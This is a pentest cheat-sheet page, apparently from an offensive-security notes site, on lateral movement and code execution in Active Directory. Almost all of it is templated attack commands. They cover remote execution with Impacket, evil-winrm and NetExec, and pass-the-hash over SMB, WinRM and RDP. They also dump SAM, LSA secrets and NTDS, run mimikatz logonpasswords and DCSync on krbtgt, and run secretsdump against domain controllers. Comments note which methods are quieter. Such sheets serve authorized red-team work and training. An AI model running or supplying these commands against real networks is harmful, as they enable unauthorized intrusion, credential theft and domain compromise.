---
title: Lateral Movement & Code Execution
category: active-directory
description: WMI/SMB/WinRM execution from Linux and Windows.
tags: [ad, lateral, psexec, wmiexec, winrm]
os: [any]
order: 30
---

## From Linux (Impacket)

```bash
# SMB-named-pipe (loud)
impacket-psexec   {{DOMAIN}}/{{USER}}:'pass'@{{RHOST}}
# WMI exec (quieter, no service install)
impacket-wmiexec  {{DOMAIN}}/{{USER}}:'pass'@{{RHOST}}
# SMB exec (modern, less common indicators)
impacket-smbexec  {{DOMAIN}}/{{USER}}:'pass'@{{RHOST}}
# Atexec (scheduled task)
impacket-atexec   {{DOMAIN}}/{{USER}}:'pass'@{{RHOST}} 'whoami'
# DCOM
impacket-dcomexec {{DOMAIN}}/{{USER}}:'pass'@{{RHOST}}

# All accept -hashes :NTHASH or -k -no-pass for kerberos
```

## WinRM

```bash
evil-winrm -i {{RHOST}} -u "{{USER}}" -p 'pass'
evil-winrm -i {{RHOST}} -u "{{USER}}" -H NTHASH
nxc winrm {{RHOST}} -u "{{USER}}" -p 'pass' -x "whoami"
```

## CME / NetExec convenience

```bash
nxc smb {{RHOST}} -u "{{USER}}" -p 'pass' -x "whoami /all"
nxc smb {{RHOST}} -u "{{USER}}" -p 'pass' --sam        # dump local SAM
nxc smb {{RHOST}} -u "{{USER}}" -p 'pass' --lsa        # dump LSA secrets
nxc smb dc.{{DOMAIN}} -u "{{USER}}" -p 'pass' --ntds   # if DA → NTDS dump
```

## Find-LocalAdminAccess

```bash
nxc smb hosts.txt -u "{{USER}}" -p 'pass' --local-auth        # local creds
nxc smb hosts.txt -u "{{USER}}" -p 'pass'                     # domain creds — Pwn3d! means admin
```

## RDP

```bash
xfreerdp /u:"{{USER}}" /p:'pass' /d:{{DOMAIN}} /v:{{RHOST}} /dynamic-resolution /cert:ignore +clipboard
# Pass-the-hash (Restricted Admin must be enabled on target)
xfreerdp /u:"{{USER}}" /pth:NTHASH /v:{{RHOST}}
```

## SOCKS-everywhere chain

```bash
proxychains -q impacket-psexec {{DOMAIN}}/{{USER}}:'pass'@10.0.0.5
```

## Credential dumping (post-admin)

```text
# Windows
mimikatz # privilege::debug ; sekurlsa::logonpasswords ; lsadump::sam ; lsadump::dcsync /user:krbtgt
nxc smb dc -u "{{USER}}" -p 'pass' -M dcsync
secretsdump.py -just-dc {{DOMAIN}}/{{USER}}:'pass'@dc.{{DOMAIN}}
```
